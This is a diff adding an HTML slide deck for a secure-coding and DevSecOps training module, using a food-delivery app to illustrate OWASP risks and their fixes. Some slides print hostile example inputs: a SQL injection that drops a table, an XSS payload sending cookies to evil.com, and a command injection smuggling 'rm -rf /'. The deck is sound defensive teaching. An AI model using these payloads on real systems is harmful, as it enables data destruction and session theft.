@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Engineering & DevSecOps</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Arial,Helvetica,sans-serif;background:#1a1a2e;color:#101820;overflow:hidden}
+.deck{position:relative;width:100vw;height:100vh}
+.slide{position:absolute;inset:0;width:100%;height:100%;display:none;flex-direction:column;background:#fff;overflow-y:auto;overflow-x:hidden;
+  font-size:clamp(10px,1.15vw,18px)}
+/* Scale all inline-styled visuals proportionally */
+.bd>*{max-width:100%}
+.slide.active{display:flex}
+code{font-family:Consolas,'Courier New',monospace;background:#F2F5F7;padding:.05em .35em;border-radius:3px;font-size:0.92em}
+:root{--blue:#3D8DFF;--ink:#101820;--body:#5D6874;--green:#2BAA76;--cyan:#6DCBF4;--panel:#F2F5F7;--blue-tint:#EAF4FF;--green-tint:#EAF6F1;--red-tint:#FFEDED;--dark:#101820;--dark-badge:#1D2A35;--code-bg:#0B1220;--code-tab:#172235;--code-text:#EAF6FF;--code-line:#587087;--dot-red:#FF6B6B;--dot-yellow:#F5C451;--dot-green:#38C987;--subtitle-light:#C9D6E0;--footer-light:#91A2B0;--high-red:#D85B5B}
+
+/* Chrome */
+.sc{padding:0;display:flex;flex-direction:column;height:100%}
+.ch{display:flex;justify-content:space-between;align-items:center;padding:1.8% 3.6% 0}
+.cm{font-size:clamp(10px,.95em,15px);font-weight:700;color:var(--blue);letter-spacing:.5px}
+.ct{font-size:clamp(10px,.95em,15px);font-weight:700;color:var(--body);letter-spacing:.5px}
+.tt{font-size:clamp(22px,2.9em,48px);font-weight:700;color:var(--ink);padding:.6% 3.6% 0;line-height:1.2}
+.dv{height:1px;background:#E0E4E8;margin:.9% 3.6% 0}
+.bd{flex:1;padding:1.2% 3.6% 3%;overflow-y:auto;overflow-x:hidden}
+.ft{display:flex;justify-content:space-between;align-items:center;padding:0 3.6% .8%;min-height:2.5%}
+.fl{font-size:clamp(8px,.8em,13px);font-weight:700;color:var(--body)}
+.fr{font-size:clamp(9px,.85em,14px);font-weight:700;color:var(--body)}
+
+/* Title slide */
+.s-title{background:var(--dark);position:relative}
+.t-rpanel{position:absolute;right:0;top:0;bottom:0;width:37%;background:var(--blue)}
+.t-rcard{position:absolute;right:5%;top:11%;width:26%;background:#fff;border-radius:.6em;padding:1.4em 1.6em}
+.t-rcard .rl{margin-bottom:.4em}
+.t-rcard .r1{font-size:clamp(14px,1.4em,22px);font-weight:700;color:var(--blue)}
+.t-rcard .r2{font-size:clamp(11px,1.05em,17px);font-weight:700;color:var(--ink)}
+.t-rcard .r3{font-size:clamp(10px,.9em,15px);font-weight:700;color:var(--green)}
+.t-badges{position:absolute;right:5.2%;top:44%;display:flex;gap:.5em;align-items:center}
+.t-badges span{font-size:clamp(16px,1.7em,28px);font-weight:700;color:#fff;padding:.5em 1em}
+.t-badges .plus{color:var(--dark-badge)}
+.t-cnt{position:relative;z-index:2;padding:3.5% 4% 4%;height:100%;display:flex;flex-direction:column}
+.t-mod{font-size:clamp(11px,1em,16px);font-weight:700;color:var(--cyan);margin-top:1.5%}
+.t-main{font-size:clamp(28px,4.5em,72px);font-weight:700;color:#fff;line-height:1.15;margin-top:2%}
+.t-sub{font-size:clamp(14px,1.85em,30px);color:var(--subtitle-light);margin-top:2%;max-width:55%;line-height:1.4}
+.t-dur{background:var(--dark-badge);border-radius:.4em;padding:.9em 1.3em;margin-top:auto;margin-bottom:6%;display:inline-block;max-width:45%}
+.t-dur span{font-size:clamp(14px,1.5em,24px);font-weight:700;color:#fff}
+.t-ft{position:absolute;bottom:1.2%;left:4%;font-size:clamp(10px,.95em,15px);font-weight:700;color:var(--footer-light)}
+
+/* End slide */
+.s-end{background:var(--dark)}
+.s-end .tbl th{color:#8899AA;border-bottom-color:#2A3A4E}
+.s-end .tbl td{color:#C9D6E0;border-bottom-color:#1D2A35}
+.s-end .tbl tr:nth-child(even) td{background:#141E2A}
+.s-end .tbl td:first-child{color:var(--cyan);font-weight:700}
+.s-end .bl li{color:#C9D6E0}
+.s-end .bl li::before{background:var(--cyan)}
+.s-end p{color:#C9D6E0 !important}
+.s-end strong{color:#fff}
+.s-end code{background:#1D2A35;color:var(--cyan)}
+.e-cnt{padding:3.5% 4% 4%;height:100%;display:flex;flex-direction:column}
+.e-mod{font-size:clamp(11px,1em,16px);font-weight:700;color:var(--cyan)}
+.e-ttl{font-size:clamp(24px,3.9em,62px);font-weight:700;color:#fff;line-height:1.2;margin-top:3%}
+.e-dv{height:1px;background:#303C4A;margin-top:4%}
+.e-pls{display:flex;margin-top:2%}
+.e-pl{flex:1}
+.e-pl-l{font-size:clamp(10px,.95em,15px);font-weight:700;color:var(--cyan);letter-spacing:.5px}
+.e-pl-l.g{color:var(--green)}
+.e-pl-v{font-size:clamp(14px,1.6em,26px);font-weight:700;color:#fff;margin-top:.5em}
+.e-ban{background:var(--blue);border-radius:.5em;padding:1.2em 1.6em;margin-top:auto;margin-bottom:1.5%}
+.e-ban span{font-size:clamp(13px,1.55em,25px);font-weight:700;color:#fff}
+
+/* Bullets */
+.bl{list-style:none;padding:0}
+.bl li{font-size:clamp(13px,1.4em,22px);color:var(--ink);line-height:1.55;padding:.25em 0 .25em 1.6em;position:relative}
+.bl li::before{content:'';position:absolute;left:0;top:.65em;width:.5em;height:.5em;border-radius:50%;background:var(--blue)}
+.bl li.s{font-size:clamp(12px,1.28em,20px);color:var(--body);padding-left:3.2em}
+.bl li.s::before{left:1.6em;width:.4em;height:.4em}
+.bl li.e{padding:.1em 0}.bl li.e::before{display:none}
+
+/* Callout boxes */
+.ib{background:var(--blue-tint);border-radius:.5em;padding:.9em 1.3em;margin-top:1em}
+.ib-l{font-size:clamp(10px,1em,16px);font-weight:700;color:var(--blue)}
+.ib-t{font-size:clamp(14px,1.5em,24px);font-weight:700;color:var(--ink);margin-top:.25em}
+.eb{background:var(--green-tint);border-radius:.5em;padding:.9em 1.3em;margin-top:1em}
+.eb-t{font-size:clamp(12px,1.2em,19px);font-weight:700;color:var(--green)}
+.db{background:var(--ink);border-radius:.5em;padding:1em 1.3em;margin-top:1em;display:flex;align-items:center;gap:1em}
+.db-l{font-size:clamp(10px,.95em,15px);font-weight:700;color:var(--cyan)}
+.db-t{font-size:clamp(14px,1.8em,29px);font-weight:700;color:#fff}
+
+/* Tables */
+.tbl{width:100%;border-collapse:separate;border-spacing:0;font-size:clamp(11px,1.15em,18px);margin-top:.6em}
+.tbl th{text-align:left;font-size:clamp(9px,.88em,14px);font-weight:700;color:var(--body);padding:.5em .8em;border-bottom:2px solid #E0E4E8}
+.tbl td{padding:.5em .8em;border-bottom:1px solid #F0F0F0;color:var(--ink);vertical-align:top}
+.tbl tr:nth-child(even) td{background:var(--panel)}
+.tbl td:first-child{font-weight:700}
+
+/* Code blocks */
+.cb{background:var(--code-bg);border-radius:.65em;overflow:hidden;font-family:Consolas,'Courier New',monospace;margin:.5em 0}
+.cb-bar{background:var(--code-tab);padding:.65em 1em;display:flex;align-items:center;gap:.5em;border-bottom:.2em solid var(--code-tab)}
+.dot{width:.8em;height:.8em;border-radius:50%}.dot.r{background:var(--dot-red)}.dot.y{background:var(--dot-yellow)}.dot.g{background:var(--dot-green)}
+.cb-fn{font-size:clamp(9px,.88em,14px);font-weight:700;color:#B9C8D8;margin-left:.65em}
+.cb-lg{font-size:clamp(8px,.8em,13px);font-weight:700;color:var(--cyan);margin-left:auto}
+.cb-body{display:flex;padding:.9em 0}
+.cb-ln{color:var(--code-line);font-size:clamp(11px,1.08em,17px);line-height:1.55;padding:0 .4em 0 .9em;text-align:right;user-select:none;border-right:1px solid #2A3A4E;min-width:2.2em}
+.cb-cd{color:var(--code-text);font-size:clamp(11px,1.08em,17px);line-height:1.55;padding:0 1.3em;white-space:pre;flex:1;overflow-x:auto}
+
+/* Slide counter (top-right, non-intrusive) */
+.slide-counter{position:fixed;top:8px;right:12px;background:rgba(16,24,32,.7);color:#aaa;font-size:12px;font-weight:700;padding:4px 10px;border-radius:4px;z-index:100;pointer-events:none;font-family:Arial,sans-serif}
+</style>
+</head>
+<body>
+<div class="deck" id="deck">
+
+<div class="slide s-title active" data-n="1">
+  <div class="t-rpanel"></div>
+  <div class="t-cnt">
+    <div class="t-mod">MODULE 27</div>
+    <div class="t-main">Secure Engineering &amp; DevSecOps</div>
+    <div class="t-sub"></div>
+    <div class="t-dur"><span>1 day</span></div>
+    <div class="t-ft">Sustain Engineering Training | July 2026</div>
+  </div>
+</div>
+
+<div class="slide" data-n="2">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct">AGENDA</span></div>
+    <div class="tt">Agenda -- Day 30 (Half Day)</div>
+    <div class="dv"></div>
+    <div class="bd"><table class="tbl"><thead><tr><th>#</th><th>Topic</th></tr></thead><tbody><tr><td>01</td><td>Why Security Matters for Sustain Engineers</td></tr><tr><td>02</td><td>OWASP Top 10 Web Application Risks</td></tr><tr><td>03</td><td>Secure Coding Practices</td></tr><tr><td>04</td><td>Secrets Management</td></tr><tr><td>05</td><td>DevSecOps Pipeline</td></tr><tr><td>06</td><td>Container Security</td></tr><tr><td>07</td><td>Lab: Fix Security Vulnerabilities</td></tr></tbody></table></div>
+    <div class="ft"><span class="fr">02</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="3">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">Why Security Matters for Sustain Engineers</div>
+    <div class="dv"></div>
+    <div class="bd"><div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">You Maintain the Code That Gets Attacked</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.txt</span><span class="cb-lg">CODE</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14</div><div class="cb-cd">┌─────────────────────────────────────────┐
+│       SECURITY INCIDENT TIMELINE        │
+│                                          │
+│  Day 1:   Developer writes code          │
+│  Day 30:  Code goes to production        │
+│  Day 31-  Sustain engineer maintains it  │
+│    365:   for the next 12 months         │
+│                                          │
+│  Day 180: Vulnerability discovered       │
+│           WHO FIXES IT?                  │
+│           ──▶ The sustain engineer ◀──   │
+│                                          │
+│  You own the security of live systems.   │
+└─────────────────────────────────────────┘</div></div></div>
+<div class="ib"><div class="ib-t" style="font-size:1.28em"><strong>FoodExpress:</strong> 73% of security patches are applied by sustain engineers, not the original developers.</div></div></div>
+    <div class="ft"><span class="fr">03</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="4">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">Security by the Numbers</div>
+    <div class="dv"></div>
+    <div class="bd"><table class="tbl"><thead><tr><th>Statistic</th><th>Impact</th></tr></thead><tbody><tr><td>83% of apps have at least 1 vulnerability</td><td>Most code you maintain has security issues</td></tr><tr><td>Average breach costs $4.45M (2023)</td><td>One SQL injection can bankrupt a startup</td></tr><tr><td>60% of breaches involve known, unpatched vulnerabilities</td><td>Sustain team's #1 security job: keep dependencies patched</td></tr><tr><td>MTTR for critical CVE: 60 days average</td><td>Too slow -- attackers exploit within hours</td></tr><tr><td>95% of security incidents are human error</td><td>Secure coding practices prevent most issues</td></tr></tbody></table></div>
+    <div class="ft"><span class="fr">04</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="5">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">OWASP Top 10 (2021)</div>
+    <div class="dv"></div>
+    <div class="bd"><div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">The Most Critical Web Application Security Risks</div>
+<table class="tbl"><thead><tr><th>#</th><th>Risk</th><th>FoodExpress Example</th></tr></thead><tbody><tr><td>A01</td><td>Broken Access Control</td><td>Customer can view other customers' orders</td></tr><tr><td>A02</td><td>Cryptographic Failures</td><td>Passwords stored in plain text</td></tr><tr><td>A03</td><td>Injection (SQL, XSS, Command)</td><td>SQL injection in menu search</td></tr><tr><td>A04</td><td>Insecure Design</td><td>No rate limiting on password reset</td></tr><tr><td>A05</td><td>Security Misconfiguration</td><td>Debug mode enabled in production</td></tr><tr><td>A06</td><td>Vulnerable Components</td><td>Outdated log4j dependency</td></tr><tr><td>A07</td><td>Authentication Failures</td><td>No account lockout after failed logins</td></tr><tr><td>A08</td><td>Data Integrity Failures</td><td>No signature verification on software updates</td></tr><tr><td>A09</td><td>Logging & Monitoring Failures</td><td>No alerts on suspicious login patterns</td></tr><tr><td>A10</td><td>Server-Side Request Forgery</td><td>Menu image URL fetches internal resources</td></tr></tbody></table></div>
+    <div class="ft"><span class="fr">05</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="6">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">A03: Injection -- SQL Injection</div>
+    <div class="dv"></div>
+    <div class="bd"><div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">The Classic Attack</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.jav</span><span class="cb-lg">JAVA</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9</div><div class="cb-cd">// VULNERABLE: String concatenation in SQL
+public List&lt;Restaurant&gt; search(String name) {
+    String sql = "SELECT * FROM restaurants WHERE name = '" + name + "'";
+    return jdbcTemplate.query(sql, restaurantMapper);
+}
+
+// Attack: name = "'; DROP TABLE restaurants; --"
+// Executed: SELECT * FROM restaurants WHERE name = '';
+//           DROP TABLE restaurants; --'</div></div></div>
+<div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">Fix: Use Parameterized Queries</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.jav</span><span class="cb-lg">JAVA</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7</div><div class="cb-cd">// SECURE: Parameterized query -- input is data, never code
+public List&lt;Restaurant&gt; search(String name) {
+    String sql = "SELECT * FROM restaurants WHERE name = ?";
+    return jdbcTemplate.query(sql, restaurantMapper, name);
+}
+// Attack input becomes: WHERE name = "'; DROP TABLE restaurants; --"
+// Treated as a literal string, not SQL code</div></div></div></div>
+    <div class="ft"><span class="fr">06</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="7">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">A03: Injection -- Cross-Site Scripting (XSS)</div>
+    <div class="dv"></div>
+    <div class="bd"><div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">Stored XSS in Restaurant Reviews</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.htm</span><span class="cb-lg">HTML</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7</div><div class="cb-cd">&lt;!-- VULNERABLE: Directly rendering user input --&gt;
+&lt;div class="review"&gt;
+    &lt;p&gt;${review.comment}&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;!-- Attack: review.comment = '&lt;script&gt;document.location="https://evil.com/steal?cookie="+document.cookie&lt;/script&gt;' --&gt;
+&lt;!-- Every user viewing this review sends their cookie to the attacker --&gt;</div></div></div>
+<div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">Fix: Sanitize Output</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.htm</span><span class="cb-lg">HTML</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7<br>8</div><div class="cb-cd">&lt;!-- SECURE: HTML-escape user input --&gt;
+&lt;div class="review"&gt;
+    &lt;p&gt;${fn:escapeXml(review.comment)}&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;!-- Or in JavaScript frameworks: React auto-escapes by default --&gt;
+&lt;!-- Angular: DomSanitizer --&gt;
+&lt;!-- Express: Use 'helmet' middleware + template escaping --&gt;</div></div></div></div>
+    <div class="ft"><span class="fr">07</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="8">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">A03: Injection -- Command Injection</div>
+    <div class="dv"></div>
+    <div class="bd"><div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">FoodExpress Report Generation</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.jav</span><span class="cb-lg">JAVA</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7</div><div class="cb-cd">// VULNERABLE: User input passed to shell command
+public void generateReport(String date) {
+    Runtime.getRuntime().exec("generate-report.sh " + date);
+}
+
+// Attack: date = "2026-01-01; rm -rf /"
+// Executed: generate-report.sh 2026-01-01; rm -rf /</div></div></div>
+<div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">Fix: Avoid shell commands; validate input</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.jav</span><span class="cb-lg">JAVA</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7</div><div class="cb-cd">// SECURE: Validate input, avoid shell execution
+public void generateReport(String date) {
+    // Validate date format
+    LocalDate.parse(date, DateTimeFormatter.ISO_LOCAL_DATE);
+    // Use ProcessBuilder with array (no shell interpretation)
+    new ProcessBuilder("generate-report.sh", date).start();
+}</div></div></div></div>
+    <div class="ft"><span class="fr">08</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="9">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">A01: Broken Access Control</div>
+    <div class="dv"></div>
+    <div class="bd"><div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">IDOR -- Insecure Direct Object Reference</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.jav</span><span class="cb-lg">JAVA</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16</div><div class="cb-cd">// VULNERABLE: No authorization check
+@GetMapping("/api/v1/orders/{orderId}")
+public Order getOrder(@PathVariable Long orderId) {
+    return orderRepository.findById(orderId).orElseThrow();
+    // Any authenticated user can view ANY order by guessing the ID
+}
+
+// SECURE: Verify the order belongs to the authenticated user
+@GetMapping("/api/v1/orders/{orderId}")
+public Order getOrder(@PathVariable Long orderId, Authentication auth) {
+    Order order = orderRepository.findById(orderId).orElseThrow();
+    if (!order.getCustomerId().equals(auth.getUserId())) {
+        throw new AccessDeniedException("Not your order");
+    }
+    return order;
+}</div></div></div>
+<div class="ib"><div class="ib-t" style="font-size:1.28em"><strong>FoodExpress:</strong> A bug let customers change the order ID in the URL and view other customers' orders, including delivery addresses.</div></div></div>
+    <div class="ft"><span class="fr">09</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="10">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">A02: Cryptographic Failures</div>
+    <div class="dv"></div>
+    <div class="bd"><div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">Password Storage</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.jav</span><span class="cb-lg">JAVA</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14</div><div class="cb-cd">// TERRIBLE: Plain text
+String stored = password;
+
+// BAD: Simple hash (crackable with rainbow tables)
+String stored = MessageDigest.getInstance("MD5").digest(password.getBytes());
+
+// BAD: SHA-256 (fast = bad for passwords; attackers can try billions/sec)
+String stored = MessageDigest.getInstance("SHA-256").digest(password.getBytes());
+
+// GOOD: bcrypt (slow by design, includes salt)
+String stored = BCrypt.hashpw(password, BCrypt.gensalt(12));
+
+// VERIFY:
+boolean matches = BCrypt.checkpw(inputPassword, storedHash);</div></div></div>
+<table class="tbl"><thead><tr><th>Algorithm</th><th>Speed (hashes/sec)</th><th>Suitable for Passwords?</th></tr></thead><tbody><tr><td>MD5</td><td>25 billion</td><td>NO</td></tr><tr><td>SHA-256</td><td>5 billion</td><td>NO</td></tr><tr><td>bcrypt (cost=12)</td><td>3,000</td><td>YES</td></tr></tbody></table></div>
+    <div class="ft"><span class="fr">10</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="11">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">Secrets Management</div>
+    <div class="dv"></div>
+    <div class="bd"><div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">The Problem: Hardcoded Secrets</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.jav</span><span class="cb-lg">JAVA</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5</div><div class="cb-cd">// NEVER DO THIS -- found in 1 in 5 repos
+public class PaymentService {
+    private static final String API_KEY = "sk_live_abc123xyz789";
+    private static final String DB_PASSWORD = "SuperSecret123!";
+}</div></div></div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.yam</span><span class="cb-lg">YAML</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4</div><div class="cb-cd"># NEVER DO THIS in application.yml committed to Git
+spring:
+  datasource:
+    password: ProductionPassword123!</div></div></div></div>
+    <div class="ft"><span class="fr">11</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="12">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">Secrets Management -- Solutions</div>
+    <div class="dv"></div>
+    <div class="bd"><div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">Hierarchy of Secret Storage</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.txt</span><span class="cb-lg">CODE</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6</div><div class="cb-cd">WORST:  Hardcoded in source code
+BAD:    In config files committed to Git
+OK:     In .env files (gitignored)
+GOOD:   Environment variables injected at deploy time
+BETTER: Secrets manager (AWS Secrets Manager, HashiCorp Vault)
+BEST:   Short-lived, auto-rotating secrets with Vault</div></div></div>
+<div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">Implementation</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.yam</span><span class="cb-lg">YAML</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10</div><div class="cb-cd"># application.yml -- use environment variable references
+spring:
+  datasource:
+    password: ${DB_PASSWORD}   # Injected at runtime
+
+# Docker Compose
+services:
+  order-service:
+    environment:
+      DB_PASSWORD: ${DB_PASSWORD}  # From host environment or .env file</div></div></div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.bas</span><span class="cb-lg">BASH</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3</div><div class="cb-cd"># .env file (NEVER committed to Git)
+DB_PASSWORD=ProductionPassword123!
+STRIPE_API_KEY=sk_live_abc123xyz789</div></div></div></div>
+    <div class="ft"><span class="fr">12</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="13">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">DevSecOps Pipeline</div>
+    <div class="dv"></div>
+    <div class="bd"><div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">Shift Left -- Find Vulnerabilities Early</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.txt</span><span class="cb-lg">CODE</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9</div><div class="cb-cd">┌──────┐   ┌──────┐   ┌──────┐   ┌──────┐   ┌──────┐
+│ Code │──▶│Build │──▶│ Test │──▶│Deploy│──▶│Monitor│
+└──┬───┘   └──┬───┘   └──┬───┘   └──┬───┘   └──┬───┘
+   │          │          │          │          │
+   ▼          ▼          ▼          ▼          ▼
+ SAST      SCA/SBOM    DAST    Container   Runtime
+ Secrets   License     Pen     Image       WAF
+ Lint      Compliance  Test    Scan        SIEM
+                                           Alerts</div></div></div>
+<table class="tbl"><thead><tr><th>Tool Type</th><th>What It Checks</th><th>Example Tools</th></tr></thead><tbody><tr><td>SAST</td><td>Source code patterns</td><td>SonarQube, Checkmarx, Semgrep</td></tr><tr><td>SCA</td><td>Dependencies for CVEs</td><td>Snyk, Dependabot, OWASP Dependency-Check</td></tr><tr><td>DAST</td><td>Running app for vulns</td><td>OWASP ZAP, Burp Suite</td></tr><tr><td>Container Scan</td><td>Image vulnerabilities</td><td>Trivy, Docker Scout, Snyk Container</td></tr><tr><td>Secrets Scan</td><td>Hardcoded credentials</td><td>GitLeaks, TruffleHog</td></tr></tbody></table></div>
+    <div class="ft"><span class="fr">13</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="14">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">Dependency Scanning</div>
+    <div class="dv"></div>
+    <div class="bd"><div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">Why It Matters</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.txt</span><span class="cb-lg">CODE</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10</div><div class="cb-cd">Your Application
+├── spring-boot-starter-web:3.1.0
+│   ├── spring-webmvc:6.0.9
+│   ├── tomcat-embed-core:10.1.8
+│   │   └── [CVE-2023-XXXX] ← VULNERABILITY HERE
+│   └── jackson-databind:2.15.2
+├── log4j-core:2.14.0
+│   └── [CVE-2021-44228] ← LOG4SHELL! Critical!
+└── mysql-connector-java:8.0.28
+    └── [CVE-2022-XXXX] ← SQL injection in driver</div></div></div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.bas</span><span class="cb-lg">BASH</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7<br>8</div><div class="cb-cd"># Scan with Trivy
+trivy fs --severity HIGH,CRITICAL .
+
+# Scan with npm audit
+npm audit
+
+# Scan Docker image
+docker scout cves foodexpress/order-service:1.0</div></div></div></div>
+    <div class="ft"><span class="fr">14</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="15">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">Container Security Best Practices</div>
+    <div class="dv"></div>
+    <div class="bd"><table class="tbl"><thead><tr><th>Practice</th><th>Why</th><th>How</th></tr></thead><tbody><tr><td>Use minimal base images</td><td>Less attack surface</td><td><code>FROM alpine</code>, <code>FROM distroless</code></td></tr><tr><td>Run as non-root</td><td>Limit privilege escalation</td><td><code>USER appuser</code></td></tr><tr><td>Scan images for CVEs</td><td>Known vulnerabilities</td><td><code>trivy image myapp:1.0</code></td></tr><tr><td>Use read-only filesystem</td><td>Prevent runtime modifications</td><td><code>--read-only</code> flag</td></tr><tr><td>Don't store secrets in images</td><td>Extractable from layers</td><td>Use env vars or secrets manager</td></tr><tr><td>Pin image versions</td><td>Reproducible, auditable</td><td><code>FROM node:18.17.1</code> not <code>node:18</code></td></tr><tr><td>Use multi-stage builds</td><td>No build tools in prod</td><td>Separate build and runtime stages</td></tr><tr><td>Set resource limits</td><td>Prevent DoS</td><td><code>--memory 512m --cpus 1.0</code></td></tr></tbody></table></div>
+    <div class="ft"><span class="fr">15</span></div>
+  </div>
+</div>
+
